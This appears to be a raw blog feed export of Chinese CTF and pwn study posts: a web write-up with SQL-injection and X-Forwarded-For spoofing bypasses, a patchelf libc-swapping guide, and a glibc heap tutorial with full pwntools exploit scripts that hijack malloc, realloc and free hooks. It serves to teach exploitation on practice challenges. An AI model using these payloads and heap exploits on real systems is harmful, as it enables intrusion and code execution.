|word|</span><br><span class="line"><span class="keyword">if</span> cols.include? word</span><br><span class="line"><span class="keyword">return</span> <span class="string">"beep boop sqli detected!"</span></span><br><span class="line">end</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> cols.length &gt; <span class="number">24</span> || !<span class="regexp">/^[0-9]+$/</span>.match?(lim) || !<span class="regexp">/^[0-9]+$/</span>.match?(off)</span><br><span class="line"><span class="keyword">return</span> <span class="string">"bad, no quills for you!"</span></span><br><span class="line">end</span><br><span class="line"></span><br><span class="line">@row = db.execute(<span class="string">"select %s from quills limit %s offset %s"</span> % [cols, lim, off])</span><br><span class="line"></span><br><span class="line">p @row</span><br><span class="line"></span><br><span class="line">erb :specific</span><br><span class="line">end</span><br></pre></td></tr></table></figure><p>限制了<code>flag</code>字符的出现和cols的长度。</p><p>但经过参考lao的wp发现：</p><p>大小写可以绕过flag检测，%00有类似mysql中<code>#</code>的作用。</p><p>参考网址：<a href="https://ctftime.org/task/15344" target="_blank" rel="noopener">https://ctftime.org/task/15344</a></p><p>于是构造payload：<code>cols=* from Flagtable%00</code></p><p><img src="image-20210411160349101.png" alt="image-20210411160349101"></p><h3 id="Spoofy（复现）"><a href="#Spoofy（复现）" class="headerlink" title="Spoofy（复现）"></a>Spoofy（复现）</h3><p>题目源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, Response, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> List</span><br><span class="line"></span><br><span class="line">FLAG: str = os.environ.get(<span class="string">"FLAG"</span>) <span class="keyword">or</span> <span class="string">"flag&#123;fake_flag&#125;"</span></span><br><span class="line"><span class="keyword">with</span> open(__file__, <span class="string">"r"</span>) <span class="keyword">as</span> f:</span><br><span class="line">    SOURCE: str = f.read()</span><br><span class="line"></span><br><span class="line">app: Flask = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">text_response</span><span class="params">(body: str, status: int = <span class="number">200</span>, **kwargs)</span> -&gt; Response:</span></span><br><span class="line">    <span class="keyword">return</span> Response(body, mimetype=<span class="string">"text/plain"</span>, status=status, **kwargs)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/source")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_source</span><span class="params">()</span> -&gt; Response:</span></span><br><span class="line">    <span class="keyword">return</span> text_response(SOURCE)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route("/")</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main_page</span><span class="params">()</span> -&gt; Response:</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"X-Forwarded-For"</span> <span class="keyword">in</span> request.headers:</span><br><span class="line">        <span class="comment"># https://stackoverflow.com/q/18264304/</span></span><br><span class="line">        <span class="comment"># Some people say first ip in list, some people say last</span></span><br><span class="line">        <span class="comment"># I don't know who to believe</span></span><br><span class="line">        <span class="comment"># So just believe both</span></span><br><span class="line">        ips: List[str] = request.headers[<span class="string">"X-Forwarded-For"</span>].split(<span class="string">", "</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> ips:</span><br><span class="line">            <span class="keyword">return</span> text_response(<span class="string">"How is it even possible to have 0 IPs???"</span>, <span class="number">400</span>)</span><br><span class="line">        <span class="keyword">if</span> ips[<span class="number">0</span>] != ips[<span class="number">-1</span>]:</span><br><span class="line">            <span class="keyword">return</span> text_response(</span><br><span class="line">                <span class="string">"First and last IPs disagree so I'm just going to not serve this request."</span>,</span><br><span class="line">                <span class="number">400</span>,</span><br><span class="line">            )</span><br><span class="line">        ip: str = ips[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> ip != <span class="string">"1.3.3.7"</span>:</span><br><span class="line">            <span class="keyword">return</span> text_response(<span class="string">"I don't trust you &gt;:("</span>, <span class="number">401</span>)</span><br><span class="line">        <span class="keyword">return</span> text_response(<span class="string">"Hello 1337 haxx0r, here's the flag! "</span> + FLAG)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> text_response(<span class="string">"Please run the server through a proxy."</span>, <span class="number">400</span>)</span><br></pre></td></tr></table></figure><p>根据审阅代码及提示,发现是X-Forwarded-For伪造.但是题目对”X-Forwarded-For”每一个参数都进行了处理我们单纯改会抱错.来自<a href="https://stackoverflow.com/questions/18264304/get-clients-real-ip-address-on-heroku所提到,我们手改X-Forwarded-For头包里依然会加上我们的正式地址" target="_blank" rel="noopener">https://stackoverflow.com/questions/18264304/get-clients-real-ip-address-on-heroku所提到,我们手改X-Forwarded-For头包里依然会加上我们的正式地址</a>.</p><p><img src="image-20210412154952876.png" alt="image-20210412154952876"></p><p>因此我们可以利用不同中间件处理http策略不同的特性.构造两个X-Forwarded-For:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:1.3.3.7</span><br><span class="line">X-Forwarded-For: 1.1.1.1, 1.3.3.7</span><br></pre></td></tr></table></figure><p>从而绕过得到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
            <tag> pwn </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>修改ELF文件libc为指定版本</title>
      <link href="/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/"/>
      <url>/2021/03/25/%E4%BF%AE%E6%94%B9ELF%E6%96%87%E4%BB%B6libc%E4%B8%BA%E6%8C%87%E5%AE%9A%E7%89%88%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<p>最近在学习堆时,常常遇到本地libc与题目libc不匹配导致一些骚套路无法在本地调试和利用.要想gdb,不仅得要安个符合版本的虚拟机或起一个docker还有部署一边pwn环境,这一点很烦(#`Д´).于是想找下有没有更方便的方法.  于是找到了patchelf更换libc的方法。</p><a id="more"></a><h3 id="glibc-all-in-one与patchelf安装"><a href="#glibc-all-in-one与patchelf安装" class="headerlink" title="glibc-all-in-one与patchelf安装"></a>glibc-all-in-one与patchelf安装</h3><p>glibc-all-in-one，正如其名是一个多版本libc的下载安装管理工具，主要支持2.19，2.23-2.29版本的libc和i686, amd64的架构。这是github一个开源项目因此我们git它既可。</p><p>安装命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/matrix1001/glibc-all-in-one.git </span><br><span class="line">cd glibc-all-in-one </span><br><span class="line">chmod a+x build download extract</span><br></pre></td></tr></table></figure><p>patchelf在ubuntu直接<code>apt install patchelf</code>即可。</p><h3 id="对应libc编译"><a href="#对应libc编译" class="headerlink" title="对应libc编译"></a>对应libc编译</h3><p>我们可以通过在glibc-all-in-one目录下执行<code>./build</code>即可获对应版本的libc和ld.so</p><p>例如：<code>./build 2.29 i686</code></p><p>下载安装编译 32位的2.29 版本libc。</p><h3 id="patchelf更改程序libc"><a href="#patchelf更改程序libc" class="headerlink" title="patchelf更改程序libc"></a>patchelf更改程序libc</h3><p>执行<code>patchelf --set-interpreter ld.so  elf</code>    来修改文件ld.so</p><p>执行<code>patchelf --replace-needed   old_libc.so  new_libc.so elf</code>来修改文件libc.so</p><p>以更改gundam文件为例,例如：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo patchelf --set-interpreter /glibc/2.26/amd64/lib/ld-2.26.so --set-rpath /glibc/2.26/amd64/lib/ ~/Desktop/pwn/buu/gumad/gundam</span><br><span class="line"></span><br><span class="line">patchelf --replace-needed /glibc/2.23/amd64/lib/libc-2.23.so /glibc/2.26/amd64/lib/libc-2.26.so ~/Desktop/pwn/buu/gumad/gundam</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><p><a href="https://www.nopnoping.xyz/2020/04/17/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/" target="_blank" rel="noopener">https://www.nopnoping.xyz/2020/04/17/%E4%BF%AE%E6%94%B9%E7%A8%8B%E5%BA%8F%E4%B8%BA%E6%8C%87%E5%AE%9Alibc%E7%89%88%E6%9C%AC-pwndbg%E5%AE%89%E8%A3%85/</a></p><p><a href="https://blog.csdn.net/github_36788573/article/details/103291343" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103291343</a></p><p><a href="https://blog.csdn.net/qq_41560595/article/details/114597342" target="_blank" rel="noopener">https://blog.csdn.net/qq_41560595/article/details/114597342</a></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> Linux </tag>
            
            <tag> libc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>劫持hook函数——学pwn小记(6)</title>
      <link href="/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/"/>
      <url>/2021/03/14/%E5%8A%AB%E6%8C%81hook%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(6)/</url>
      
        <content type="html"><![CDATA[<p>在glibc中，通过指定hook函数，可以修改<code>malloc()</code>、<code>readloc()</code>、<code>free()</code>等函数的行为，从而帮助我们调试使用动态分配内存的程序。我们可以利用这一个特性通过篡改hook的值，使程序在调用动态分配内存相关函数前改变程序流，执行我们想执行的代码。</p><a id="more"></a><h2 id="malloc-hook"><a href="#malloc-hook" class="headerlink" title="__malloc_hook"></a>__malloc_hook</h2><p><code>__malloc_hook</code> 是一个弱类型的函数指针，指向 <code>void *function（size_t size ,void *caller ）</code>,在调用<code>malloc()</code>函数是会判断<code>__malloc_hook</code>的值是否为空，不为空则调用它.因此我们可以利用恶意漏洞来覆盖<code>__malloc_hook</code> 的值.</p><p>在之前<a href="https://lexsd6.github.io/2021/03/11/fastbin%E4%BA%8C%E6%AC%A1%E9%87%8A%E6%94%BE%E2%80%94%E2%80%94%E5%AD%A6pwn%E5%B0%8F%E8%AE%B0(5)/#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF">fastbin二次释放——学pwn小记(5)</a>中,解例题<code>babyheap_0ctf_2017</code>时用的就是<code>__malloc_hook</code>来调用one_gadget.具体exp可以看前面链接中的文章这里不多说.</p><p><img src="image-20210315165005926.png" alt="image-20210315165005926"></p><h2 id="realloc-hook"><a href="#realloc-hook" class="headerlink" title="__realloc_hook"></a>__realloc_hook</h2><p><code>__realloc_hook</code>与<code>__malloc_hook</code> 相似是一个弱类型的指针.在调用<code>realloc()</code>函数是会判断<code>__realloc_hook</code>的值是否为空,不为空则执行其执行的代码.这是<code>__realloc_hook</code>的一种用法。</p><p>同时，我们也可以用<code>__malloc_hook</code>来指向<code>_libc_realloc()</code>函数内部(即强行调用<code>realloc()</code>)然后通过<code>__realloc_hook</code>来触发one_gadget.</p><p>下面还是以babyheap_0ctf_2017仔细来说下。</p><p><code>__realloc_hook</code>只在<code>__malloc_hook</code>的前8个字节（64位程序）所以很容易覆盖掉。</p><p><img src="image-20210315194932627.png" alt="image-20210315194932627"></p><p>因此我们只需将<code>__malloc_hook</code>的值改成__libc_realloc中某一个gatget的值。</p><p>将<code>__malloc_hook</code>前的8个字节,即<code>__realloc_hook</code>改成one_gatget的值。</p><p>同时因为<code>__libc_realloc</code>有大量push与pop的gatget，我们可以同过它来寻找调节寄存器和堆栈使它能满足one_gatget的条件。</p><p><img src="image-20210315203233831.png" alt="image-20210315203233831"></p><p><img src="image-20210315203332512.png" alt="image-20210315203332512"></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./babyheap'</span>)</span><br><span class="line">p=process(<span class="string">'./babyheap'</span>)</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',26886)</span></span><br><span class="line"><span class="comment">#process('./babyheap')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(num,text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.sendline(str(len(text)))</span><br><span class="line">p.sendline(str(text))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(num)</span>:</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">x=p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast</span><span class="params">()</span>:</span></span><br><span class="line">       </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">        </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="number">0x10</span>*<span class="string">'a'</span></span><br><span class="line">pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">pay+=p64(<span class="number">0x88</span>)+p64(<span class="number">0x88</span>)</span><br><span class="line">        pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>) </span><br><span class="line">        pay+=p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="string">'0'</span>,pay)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="string">'3'</span>,pay)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">fill(<span class="number">1</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line"><span class="comment">#free(2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> base,malloc_hook</span><br><span class="line">pay=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="string">'3'</span>,pay)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</span><br><span class="line">print(addr)</span><br><span class="line">base=addr<span class="number">-0x3c4b78</span></span><br><span class="line">malloc_hook=base+<span class="number">0x3c4b10</span></span><br><span class="line">log.info(<span class="string">"libc_base: "</span>+hex(base))</span><br><span class="line">log.info(<span class="string">"malloc_hook:"</span>+hex(malloc_hook))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">fill(<span class="string">'2'</span>,p64(malloc_hook<span class="number">-0x30</span>+<span class="number">0xd</span>))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#fake</span></span><br><span class="line">one=base+<span class="number">0xf1207</span></span><br><span class="line">realloc_hook=<span class="number">0x84710</span>+base</span><br><span class="line">fill(<span class="string">'6'</span>,p8(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0</span>)+p64(one)+p64(realloc_hook))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">alloc(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">fast()</span><br><span class="line">leak()</span><br><span class="line">pwn()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="free-hook"><a href="#free-hook" class="headerlink" title="__free_hook"></a>__free_hook</h2><p><code>__free_hook</code>的利用有所不同，应为附近一大片都没有可以利用的字节。但是如果可以攻击main_arena,篡改top到<code>__free_hook</code>之前，可以通过分配chunk来覆盖劫持<code>__free_hook</code>。以babyheap_0ctf_2017题目来分析：</p><p>同过gdb，我们可以看到，<code>main_arena</code>与<code>__malloc_hook</code>是非常接近的。</p><p><img src="image-20210315205920462.png" alt="image-20210315205920462"></p><p>接着就是top地址的问题。top地址指向的是top chunk 的地址。</p><p><img src="image-20210315211731514.png" alt="image-20210315211731514"></p><p>我们可以看到现在top chunk 大小为0x20e61。</p><p><img src="image-20210315211541654.png" alt="image-20210315211541654"></p><p>而通过在遍历<code>__free_hook</code>附近大于0x20e61的字节就只有<code>__free_hook-0xb58</code>处</p><p><img src="image-20210315212414978.png" alt="image-20210315212414978"></p><p>所以我们覆盖top地址到<code>__free_hook-0xb58</code>处，然后创造chunk使最后一个能覆盖到free_hook,并将free_hook写入system的值.再在一个chunk里写入<code>bin/sh</code>，再free ta。</p><p><img src="image-20210315213511550.png" alt="image-20210315213511550"></p><p><img src="image-20210315213300949.png" alt="image-20210315213300949"></p><p>exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">e=ELF(<span class="string">'./babyheap'</span>)</span><br><span class="line">p=process(<span class="string">'./babyheap'</span>)</span><br><span class="line"><span class="comment">#p=remote('node3.buuoj.cn',26886)</span></span><br><span class="line"><span class="comment">#process('./babyheap')</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">alloc</span><span class="params">(size)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fill</span><span class="params">(num,text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">p.sendline(str(len(text)))</span><br><span class="line">p.sendline(str(text))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dump</span><span class="params">(num)</span>:</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">x=p.recvuntil(<span class="string">'Content: \n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> p.recv()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fast</span><span class="params">()</span>:</span></span><br><span class="line">       </span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#4</span></span><br><span class="line">        </span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">pay=<span class="number">0x10</span>*<span class="string">'a'</span></span><br><span class="line">pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">pay+=p64(<span class="number">0x88</span>)+p64(<span class="number">0x88</span>)</span><br><span class="line">        pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>) </span><br><span class="line">        pay+=p8(<span class="number">0x80</span>)</span><br><span class="line">fill(<span class="string">'0'</span>,pay)</span><br><span class="line"></span><br><span class="line">pay=<span class="string">'a'</span>*<span class="number">0x10</span></span><br><span class="line">pay+=p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">fill(<span class="string">'3'</span>,pay)</span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#1</span></span><br><span class="line">alloc(<span class="number">0x10</span>) <span class="comment">#2</span></span><br><span class="line">fill(<span class="number">1</span>,<span class="string">'aaaa'</span>)</span><br><span class="line">fill(<span class="number">2</span>,<span class="string">'bbbb'</span>)</span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line"><span class="comment">#free(2)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">global</span> base,malloc_hook</span><br><span class="line">pay=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x91</span>)</span><br><span class="line">fill(<span class="string">'3'</span>,pay)</span><br><span class="line">alloc(<span class="number">0x80</span>) <span class="comment">#5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">addr=u64(dump(<span class="number">2</span>)[:<span class="number">8</span>])</span><br><span class="line">print(addr)</span><br><span class="line">base=addr<span class="number">-0x3c4b78</span></span><br><span class="line">malloc_hook=base+<span class="number">0x3c4b10</span></span><br><span class="line">log.info(<span class="string">"libc_base: "</span>+hex(base))</span><br><span class="line">log.info(<span class="string">"malloc_hook:"</span>+hex(malloc_hook))</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">()</span>:</span></span><br><span class="line">system=base+<span class="number">0x453a0</span></span><br><span class="line">free_hook=base+<span class="number">0x3c67a8</span></span><br><span class="line">log.info(<span class="string">"system: "</span>+hex(system))</span><br><span class="line">log.info(<span class="string">"free_hook:"</span>+hex(free_hook))</span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#4</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">fill(<span class="string">'2'</span>,p64(malloc_hook<span class="number">-0x30</span>+<span class="number">0xd</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">alloc(<span class="number">0x60</span>)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">alloc(<span class="number">0x60</span>) <span class="comment">#fake 6</span></span><br><span class="line">one=base+<span class="number">0xf1207</span></span><br><span class="line">fill(<span 